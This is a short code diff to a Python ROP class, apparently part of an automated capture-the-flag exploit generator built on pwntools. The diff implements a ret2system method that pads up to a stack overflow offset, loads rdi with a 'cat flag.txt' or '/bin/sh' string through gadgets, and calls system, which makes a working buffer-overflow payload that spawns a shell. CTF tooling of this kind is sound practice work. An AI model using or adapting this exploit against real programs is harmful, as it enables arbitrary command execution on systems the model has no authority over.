@@ -8,7 +8,6 @@ class ROP:
         self.filename = analysis.binary
         self.properties = properties
         self.offset = Get2overflow(self.filename).buf()
-        print(self.offset)
         self.e = ELF(self.filename)
         self.gadgets = []
 
@@ -39,7 +38,16 @@ class ROP:
         return payload
     
     def ret2system(self):
-        pass
+        self.find_gadgets()
+        payload = cyclic(self.offset)
+        if self.analysis.has_catflagtxt():
+            payload += self.fill_reg("rdi", self.analysis.get_catflagtxt())
+        elif self.analysis.has_binsh():
+            payload += self.fill_reg("rdi", self.analysis.get_binsh())
+        payload += self.fill_reg("rsi", 0)
+        payload += p64(self.e.sym["system"])
+
+        return payload
 
     def supporting_functions_here(self): # ---------------------------------------------
         print("example support function")
